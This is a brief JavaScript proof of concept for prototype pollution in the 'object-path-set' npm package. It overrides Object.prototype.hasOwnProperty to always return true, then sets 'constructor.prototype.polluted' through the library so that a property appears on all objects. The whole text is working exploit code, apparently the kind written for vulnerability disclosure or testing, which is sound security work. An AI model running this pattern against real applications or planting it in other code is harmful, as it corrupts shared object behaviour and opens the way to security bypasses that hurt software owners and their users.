Object.prototype.hasOwnProperty = () => true;
const setPath = require('object-path-set');
var obj = {};
console.log({}.polluted);
setPath({}, 'constructor.prototype.polluted', 'yes');
console.log('{ ' + obj.polluted + ', ' + 'yes' + ' }');